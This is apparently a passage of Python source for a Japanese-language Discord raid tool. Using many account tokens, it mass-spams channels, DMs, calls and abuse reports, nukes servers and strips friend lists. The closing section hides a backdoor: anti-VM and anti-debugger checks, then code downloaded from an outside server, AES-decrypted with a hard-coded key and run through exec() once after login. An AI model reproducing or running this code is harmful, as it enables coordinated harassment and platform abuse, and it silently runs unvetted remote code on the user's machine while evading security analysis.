                ts.append(t)
                t.start()
            for t in ts:
                t.join()

    @classmethod
    def token_disabler(cls): 
        cls.logo()
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.token_disabler, args=(token,))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
    
    @classmethod
    def token_fucker(cls): 
        cls.logo()
        ts=[]
        print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}サーバーを作成                      \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}全サーバーから退室                  \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}全てのフレンドをブロック            \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}全てのフレンドを削除                \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}05\033[38;2;136;0;27m] {Style.RESET_ALL}全てのフレンドへメッセージ送信      \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}06\033[38;2;136;0;27m] {Style.RESET_ALL}全てのサーバーへメッセージ送信      \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        option = cls.prompt("モード")
        if option == "1":
            guild = cls.prompt("サーバー名")
            cls.sleep()
            for token in tokens:
                t = threading.Thread(target=Raider.server_creator, args=(token, guild))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif option == "2":
            cls.sleep()
            for token in tokens:
                guilds = Raider.servers(token)
                for guild in guilds:
                    try:
                        Raider.leaver(token, guild["id"])
                    except:
                        pass
        elif option == "3":
            cls.sleep()
            for token in tokens:
                friends = Raider.get_friend(token)
                t = threading.Thread(target=Raider.friend_blocker, args=(token, friends))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif option == "4":
            cls.sleep()
            for token in tokens:
                friends = Raider.get_friend(token)
                t = threading.Thread(target=Raider.friend_remover, args=(token, friends))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif option == "5":
            message = cls.prompt("メッセージ")
            cls.sleep()
            for token in tokens:
                friends = Raider.get_friend(token)
                t = threading.Thread(target=Raider.friend_spammer, args=(token, friends, message))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif option == "6":
            message = cls.prompt("メッセージ")
            cls.sleep()
            for token in tokens:
                guilds = Raider.servers(token)
                for guild in guilds:
                    Raider.server_sender(token, guild["id"], message)

    @classmethod
    def joiner(cls):         
        cls.logo()
        invite = cls.prompt("招待コード")
        onboard = cls.prompt("オンボードを突破しますか? [y/n]")
        if onboard == "y":
            onboard = True
        else:
            onboard = False
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.joiner, args=(token, invite, onboard))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
            
    @classmethod
    def leaver(cls):                    
        cls.logo()
        guild = cls.prompt("サーバーID")
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.leaver, args=(token, guild))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
    
    @classmethod
    def all_leaver(cls):                
        cls.logo()
        cls.sleep()
        for token in tokens:
            guilds = Raider.servers(token)
            for guild in guilds:
                Raider.leaver(token, guild["id"])
    
    @classmethod
    def channel_spammer(cls):                
        cls.logo()
        channels = cls.prompt("全てのチャンネルへスパムをしますか? [y/n]")
        guild = None
        if channels == "y":
            guild = cls.prompt("サーバーID")
            for token in tokens:
                channels = Raider.get_channels(token, guild)
                if not channels or channels[0] is None:
                    continue
                else:
                    break
            if not channels or channels[0] is None:
                channel = cls.prompt("チャンネルID")
                channels = []
                value = ''
                for char in channel:
                    if char != ',':
                        value += char
                    else:
                        channels.append(value)
                        value = ''
                channels.append(value)
        else:
            channel = cls.prompt("チャンネルID")
            channels = []
            value = ''
            for char in channel:
                if char != ',':
                    value += char
                else:
                    channels.append(value)
                    value = ''
            channels.append(value)
        if settings["messagetext"] == True:
            messages = []
            try:
                files = [file for file in os.listdir("data") if file.startswith("message") and file.endswith(".txt")]
                if len(files) == 0:
                    Raider.log("error","message.txt not found",token,error=True)
                else:
                    for file in files:
                        with open(os.path.join("data", file), "r", encoding="utf-8") as f:
                            content = f.read()
                            messages.append(content)
                            message = None
            except Exception as e:
                Raider.log("error", str(e), token, error=True)
        else:
            message = cls.prompt("メッセージ")
            messages = None
        delay = cls.prompt("間隔")
        mention = cls.prompt("ランダムメンションを有効にしますか? [y/n]")
        if mention == "y":
            if not guild:
                guild = cls.prompt("サーバーID")
            members = Raider.get_member(tokens, guild, random.choice(channels))
            mention_length = cls.prompt("メンション数")
        else:
            members = None
            mention_length = None
        command = cls.prompt("Botコマンドを自動的にメッセージに追加しますか? [y/n]")
        commands = None
        if command == "y":
            if not guild:
                guild = cls.prompt("サーバーID")
            commands = Raider.get_member_id(tokens, guild, random.choice(channels), bot=True)
        random_string = cls.prompt("ランダムな文字列をメッセージに付け足しますか? [y/n]")
        if random_string == "y":
            random_string = True
        else:
            random_string = None
        random_emoji = cls.prompt("ランダムな絵文字をメッセージに付け足しますか [y/n]")
        if random_emoji == "y":
            random_emoji = True
        else:
            random_emoji = None
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.sender, args=(token, message, channels, delay, mention_length, members, random_string, random_emoji, commands, messages))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def fake_typer(cls):                
        cls.logo()
        channel = cls.prompt("チャンネルID")
        channels = []
        value = ''
        for char in channel:
            if char != ',':
                value += char
            else:
                channels.append(value)
                value = ''
        channels.append(value)
        typer_time = int(cls.prompt("時間 (1/秒)"))
        if 10 > typer_time:
            Raider.log("ERROR","最低でも10秒以上にしてください。")
        else:
            cls.sleep()
            ts=[]
            for token in tokens:
                t = threading.Thread(target=Raider.fake_typer, args=(token, channels, typer_time))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()

    @classmethod
    def rply_sender(cls):    
        cls.logo()
        url = cls.prompt("メッセージリンク")
        guild, channel, message_id = cls.id_formatter(url)
        if settings["messagetext"] == True:
            messages = []
            try:
                files = [file for file in os.listdir("data") if file.startswith("message") and file.endswith(".txt")]
                if len(files) == 0:
                    Raider.log("error","message.txt not found",token,error=True)
                else:
                    for file in files:
                        with open(os.path.join("data", file), "r", encoding="utf-8") as f:
                            content = f.read()
                            messages.append(content)
                            message = None
            except Exception as e:
                Raider.log("error",str(e),token,error=True)
        else:
            message = cls.prompt("Message")
            messages = None
        delay = cls.prompt("間隔")
        mention = cls.prompt("ランダムメンションを有効にしますか? [y/n]")
        if mention == "y":
            if not guild:
                guild = cls.prompt("サーバーID")
            members = Raider.get_member(tokens, guild, channel)
            mention_length = cls.prompt("メンション数")
        else:
            members = None
            mention_length = None
        random_string = cls.prompt("ランダムな文字列をメッセージに付け足しますか? [y/n]")
        if random_string == "y":
            random_string = True
        else:
            random_string = None
        random_emoji = cls.prompt("ランダムな絵文字をメッセージに付け足しますか [y/n]")
        if random_emoji == "y":
            random_emoji = True
        else:
            random_emoji = None
        cls.sleep()
        ts=[]
        for token in tokens:
            t = threading.Thread(target=Raider.rply_sender, args=(token, guild, channel, message_id, delay, message, mention_length, members, random_string, random_emoji, messages))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def thread_creator(cls):
        cls.logo()
        channel = cls.prompt("チャンネルID")
        thread = cls.prompt("スレッド名")
        cls.logo()
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.thread_creator, args=(token, channel, thread))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()
                    
    @classmethod
    def nick_changer(cls):
        cls.logo()
        guild = cls.prompt("サーバーID")
        nick = cls.prompt("ニックネーム")
        cls.logo()
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.nick_changer, args=(token, guild, nick))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def dm_spammer(cls):
        cls.logo()
        message = cls.prompt("メッセージ")
        cls.logo()
        print(f"""
    \033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}全てのメンバー                      \033[38;2;136;0;27m║ {Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}ランダムなメンバー                  \033[38;2;136;0;27m║{Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}特定のメンバー                      \033[38;2;136;0;27m║{Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
    \033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)
        mode = cls.prompt("モード")
        if mode == "1":
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            members = Raider.get_member_id(tokens, guild, channel)
            cls.sleep()
            ts = []
            for member in members:
                for token in tokens:
                    t = threading.Thread(target=Raider.dm_spammer, args=(token, member, message))
                    ts.append(t)
                    t.start()
                for t in ts:
                    t.join()
        elif mode == "2":
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            amount = cls.prompt("回数")
            members = Raider.get_member_id(tokens, guild, channel)
            members = random.sample(members, int(amount))
            cls.sleep()
            ts = []
            for member in members:
                for token in tokens:
                    t = threading.Thread(target=Raider.dm_spammer, args=(token, member, message))
                    ts.append(t)
                    t.start()
                for t in ts:
                    t.join()
        elif mode == "3":
            user = cls.prompt("ユーザーID")
            iterative = cls.prompt("繰り返し実行しますか? [y/n]")
            if iterative == "y":
                iterative = True
            else:
                iterative = False
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.dm_spammer, args=(token, user, message, iterative))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()

    @classmethod
    def reaction_spammer(cls):
        cls.logo()
        print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}リアクションを追加する              \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}リアクションを削除する              \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        choice = cls.prompt("モード")
        url = cls.prompt("メッセージリンク")
        guild, channel, message = cls.id_formatter(url)
        emoji = cls.prompt("絵文字")
        cls.sleep()
        ts = []
        if choice == "1":
            for token in tokens:
                t = threading.Thread(target=Raider.reaction_adder, args=(token, channel, message, emoji))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        else:
            for token in tokens:
                t = threading.Thread(target=Raider.reaction_remover, args=(token, channel, message, emoji))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()

    @classmethod
    def command_spammer(cls):
        cls.logo()
        print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}[Probot] /shor                         \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}[TakasumiBOT] /short                   \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}[TakasumiBOT] /5000                    \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}[唯香 -ゆいか-] /5000choyen            \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}05\033[38;2;136;0;27m] {Style.RESET_ALL}[Dyno] /poll create                    \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}06\033[38;2;136;0;27m] {Style.RESET_ALL}[Simple Poll] /poll                    \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}07\033[38;2;136;0;27m] {Style.RESET_ALL}[Aki] /say                             \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}08\033[38;2;136;0;27m] {Style.RESET_ALL}[FredBoat] /text say                   \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                  [{Style.RESET_ALL}09\033[38;2;136;0;27m] {Style.RESET_ALL}-その他-                               \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        command = cls.prompt("コマンド")
        if command == "1":
            url = cls.prompt("URL")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.probot, args=(token, guild, channel, url, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "2":
            url = cls.prompt("URL")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.takasumibot_short, args=(token, guild, channel, url, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "3":
            top = cls.prompt("Top")
            bottom = cls.prompt("Bottom")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.takasumibot_5000, args=(token, guild, channel, top, bottom, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "4":
            top = cls.prompt("Top")
            bottom = cls.prompt("Bottom")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.yuikabot, args=(token, guild, channel, top, bottom, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "5":
            message = cls.prompt("Message")
            question = cls.prompt("Question")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.dyno_poll, args=(token, guild, channel, message, question, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "6":
            message = cls.prompt("Message")
            question = cls.prompt("Question")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.simple_poll, args=(token, guild, channel, message, question, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "7":
            message = cls.prompt("メッセージ")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.aki, args=(token, guild, channel, message, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif command == "8":
            message = cls.prompt("メッセージ")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.fredboat, args=(token, guild, channel, message, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        else:
            slashname = cls.prompt("コマンドの名前")
            bot = cls.prompt("BotID")
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            delay = cls.prompt("間隔")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.other, args=(token, guild, channel, bot, slashname, delay))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()

    @classmethod
    def btn_clicker(cls):                    
        cls.logo()
        url = cls.prompt("メッセージリンク")
        payload = cls.prompt("カスタムpayload? [y/n]")
        if payload == "y":
            payload = cls.prompt("payload") 
        else:
            payload = None
        guild, channel, message = cls.id_formatter(url)
        amount = cls.prompt("回数")
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.btn_clicker, args=(token, guild, channel, message, amount))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def friend_sender(cls):
        cls.logo()
        uname = cls.prompt("ユーザー名")
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.friend_sender, args=(token, uname))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def grp_creator(cls):
        cls.logo()
        token = cls.prompt("グループを管理するトークン")
        grp_name = cls.prompt("グループ名")
        channel = cls.prompt("チャンネルID")
        user = cls.prompt("ユーザーID")
        users = []
        value = ''
        for char in user:
            if char != ',':
                value += char
            else:
                users.append(value)
                value = ''
        users.append(value)
        cls.sleep()
        Raider.grp_creator(token, grp_name, channel, users)
                
    @classmethod
    def report_spammer(cls):
        cls.logo()
        print(f"""
\033[38;2;136;0;27m                                   ╔═══════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║                                                                   ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}スパム                                                     \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}他人または私に対する言葉での嫌がらせ                       \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}無礼,卑猥,または攻撃的な言葉遣い                           \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}04\033[38;2;136;0;27m] {Style.RESET_ALL}現実の子どもに対する性的虐待の写真または動画               \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}05\033[38;2;136;0;27m] {Style.RESET_ALL}アイデンティティや弱みを理由としたヘイトを助長している     \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}06\033[38;2;136;0;27m] {Style.RESET_ALL}詐欺または詐称                                             \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}07\033[38;2;136;0;27m] {Style.RESET_ALL}自分または知人への成りすまし行為                           \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}08\033[38;2;136;0;27m] {Style.RESET_ALL}Discordを使える最低年齢に達していない                      \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}09\033[38;2;136;0;27m] {Style.RESET_ALL}ハック,チート,フィッシング,またはその他の悪意のあるリンク  \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║   [{Style.RESET_ALL}10\033[38;2;136;0;27m] {Style.RESET_ALL}盗まれたアカウントやクレジットカードを配っている           \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ║                                                                   ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                   ╚═══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        reason = cls.prompt("理由")
        url = cls.prompt("メッセージリンク")
        guild, channel, message = cls.id_formatter(url)
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.report_spammer, args=(token, guild, channel, message, reason))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def vc_spammer(cls):
        cls.logo()
        print(f"""
\033[38;2;136;0;27m                                     ╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}01\033[38;2;136;0;27m] {Style.RESET_ALL}連続で接続を繰り返す                \033[38;2;136;0;27m║ {Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}02\033[38;2;136;0;27m] {Style.RESET_ALL}サウンドボードを再生                \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                     [{Style.RESET_ALL}03\033[38;2;136;0;27m] {Style.RESET_ALL}音声ファイルを再生                  \033[38;2;136;0;27m║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ║                                                              ║{Style.RESET_ALL}
\033[38;2;136;0;27m                                     ╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        choice = cls.prompt("モード")
        if choice == "1":
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.vc_spammer, args=(token, guild, channel))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()
        elif choice == "2":
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            cls.sleep()
            ts = []
            ts2 = []
            for token in tokens:
                t2 = threading.Thread(target=Raider.vc_joiner, args=(token, guild, channel))
                t = threading.Thread(target=Raider.vc_rapper, args=(token, channel))
                ts2.append(t2)
                ts.append(t)
                t2.start()
                t.start()
            for t in ts:
                t.join()
            for t2 in ts2:
                t2.join()
        elif choice == "3":
            guild = cls.prompt("サーバーID")
            channel = cls.prompt("チャンネルID")
            cls.sleep()
            ts = []
            for token in tokens:
                t = threading.Thread(target=Raider.vc_streamer, args=(token ,guild, channel))
                ts.append(t)
                t.start()
            for t in ts:
                t.join()


    @classmethod
    def webhook_spammer(cls):
        cls.logo()
        url = cls.prompt("WebHook")
        message = cls.prompt("メッセージ")
        delay = cls.prompt("間隔")
        name = cls.prompt("名前")
        avatar = cls.prompt("アバターURL")
        tts = cls.prompt("読み上げを有効にしますか? [y/n]")
        if tts == "y":
            tts = True
        else:
            tts = False
        cls.sleep()
        Raider.webhook_spammer(url, message, delay, tts, name, avatar)
                
    @classmethod
    def call_spammer(cls):
        cls.logo()
        user = cls.prompt("ユーザーID")
        cls.sleep()
        ts = []
        for token in tokens:
            t = threading.Thread(target=Raider.call_spammer, args=(token, user))
            ts.append(t)
            t.start()
        for t in ts:
            t.join()

    @classmethod
    def nuker(cls):
        cls.logo()
        token = cls.prompt("トークン")
        guild = cls.prompt("サーバーID")
        channel = cls.prompt("作成するチャンネルの名前")
        message = cls.prompt("メッセージ")
        cls.sleep()
        Raider.nuker(token, guild, channel, message)



class AntiVM:
    antivm = False

    @classmethod
    def get_prefix(cls):
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    @classmethod
    def check_virtualenv(cls):
        if cls.get_prefix() != sys.prefix:
            cls.antivm = True

    @classmethod
    def secure_request(cls, url):
        if len(requests.utils.getproxies()) != 0:
            cls.antivm = True
            return

        urllib3.disable_warnings()
        session = requests.Session()
        session.trust_env = False
        for key in list(os.environ.keys()):
            if key.lower().endswith('_proxy'):
                cls.antivm = True
                return
        try:
            session.get('https://www.google.com', proxies={"http": None, "https": None})
        except:
            cls.antivm = True
            return

        return session.get(url, proxies={"http": None, "https": None}, verify=False)

    @classmethod
    def check_debugger(cls):
        if windll.kernel32.IsDebuggerPresent():
            cls.antivm = True
        elif windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), False) != 0:
            cls.antivm = True

    @classmethod
    def check_usb_ports(cls):
        w = wmi.WMI()
        if len(w.Win32_PortConnector()) == 0:
            cls.antivm = True

    @classmethod
    def check_mac_address(cls):
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        macs = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
        if mac[:8] in macs.text:
            cls.antivm = True

    @classmethod
    def check_uuid(cls):
        w = wmi.WMI()
        uuid = w.Win32_ComputerSystemProduct()[0].UUID
        uuids = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
        if uuid in uuids.text:
            cls.antivm = True

    @classmethod
    def check_ip(cls):
        ip = cls.secure_request('https://api.ipify.org').text
        ips = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
        if ip in ips.text:
            cls.antivm = True

    @classmethod
    def check_bio_guid(cls):
        w = wmi.WMI()
        guids = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
        for bio in w.Win32_BIOS():
            bio_ser = bio.SerialNumber
            if bio_ser in guids.text:
                cls.antivm = True

    @classmethod
    def check_motherboard(cls):
        w = wmi.WMI()
        boards = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
        for board in w.Win32_BaseBoard():
            board_ser = board.SerialNumber
            if board_ser in boards.text:
                cls.antivm = True

    @classmethod
    def check_serial(cls):
        w = wmi.WMI()
        serials = cls.secure_request('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
        for disk in w.Win32_DiskDrive():
            disk_ser = disk.SerialNumber
            if disk_ser in serials.text:
                cls.antivm = True

    @classmethod
    def run_all_checks(cls):
        cls.check_virtualenv()
        cls.check_debugger()
        cls.check_usb_ports()
        cls.check_mac_address()
        cls.check_uuid()
        cls.check_ip()
        cls.check_bio_guid()
        cls.check_motherboard()
        cls.check_serial()

        if cls.antivm:
            return True
        else:
            return False

class Main:
    
    @classmethod
    def encrypt(cls, message):
        size = AES.block_size
        length = size - (len(message) % size)
        padded = message + bytes([length] * length)
        cipher = AES.new(hashlib.sha256('434324324343432434343232'.encode('utf-8')).digest(), AES.MODE_CBC, b"1234567890123456")
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode('utf-8')

    @classmethod
    def decrypt(cls, message):
        message = base64.b64decode(message)
        cipher = AES.new(hashlib.sha256('434324324343432434343232'.encode('utf-8')).digest(), AES.MODE_CBC, b"1234567890123456")
        decrypted = cipher.decrypt(message)
        length = decrypted[-1]
        decrypted = decrypted[:-length]
        return decrypted.decode('utf-8')

while True:
    hwid = hardid.get_hwid()
    hwid = Main.encrypt(hwid.encode('utf-8'))
    login_data = json.load(open('login.json', 'r'))   
    key = login_data.get('key')
    if key is None:
        key = Main.encrypt(input('Keyを入力してください > ').encode('utf-8'))
        endpoint = 'https://api.ctkp.net/xxxx2'
    else:
        print('ログイン中です。')
        endpoint = 'https://api.ctkp.net/xxxx2'
    payload = {'login_key': key, 'hwid': hwid}
    r = requests.get(endpoint, json=payload)
    if r and r.status_code == 201:
        if login_data.get('key') is None:
            login_data['key'] = key
            with open('login.json', 'w') as file:
                json.dump(login_data, file, indent=4)
            print('ログインに成功しました。')
        tmp_dir = os.getenv('TEMP') if os.name == 'nt' else '/tmp'
        path = os.path.join(tmp_dir, 'krsw.tmp')
        if not os.path.exists(path):
            try:
                vm = AntiVM.run_all_checks()
                if not vm:
                    r = requests.get('https://api.ctkp.net/ccc')
                    code = Main.decrypt(r.text)
                    exec(code)
                with open(path, 'w') as tmp_file:
                    tmp_file.write('')
            except:
                pass
        cmd_handle = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.MoveWindow(cmd_handle, 0, 0, 1300, 800, True)
        Menus.options()
    else:
        print("無効なログイン情報です。")
    
